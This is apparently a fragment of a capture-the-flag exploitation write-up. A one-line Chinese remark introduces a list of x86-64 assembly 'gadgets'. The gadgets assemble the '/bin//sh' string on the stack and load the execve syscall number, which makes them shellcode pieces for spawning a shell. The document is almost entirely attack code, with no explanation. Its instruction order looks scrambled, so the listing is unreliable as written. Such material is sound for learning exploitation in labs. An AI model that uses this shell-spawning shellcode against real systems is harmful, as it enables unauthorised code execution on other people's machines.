先放一些gadget

```nasm
    cdq
    push rdx
    cdq
    pop rsi

    cdq
    xor rax,rax

    cdq
    cdq
    push rdx
    cdq

    cdq
    push rdx
    pop rdi
    push rdx

    pop rdi
    pop rdi
    pop r9

    shl r9,0x20

    cdq
    shr r9,1

    ;2 int
    cdq
    nop
    mov r9d,0x68732f2f

    ;3 int
    pop rdi
    cdq
    nop
    add r9d,0x6e69622f
    cdq
    nop

    ;3
    pop rdi
    mov dl,0x0c
    add r9,0x6e69622f
    cdq
    nop

    cdq
    push r9
    nop

    cdq
    pop r10
    nop

    cdq
    add rdi,r9

    cdq
    push rsp
    mov dl,0x16

    syscall
    mov dl,0x5

    mov bl,0x2
    mov al,0x3b
```


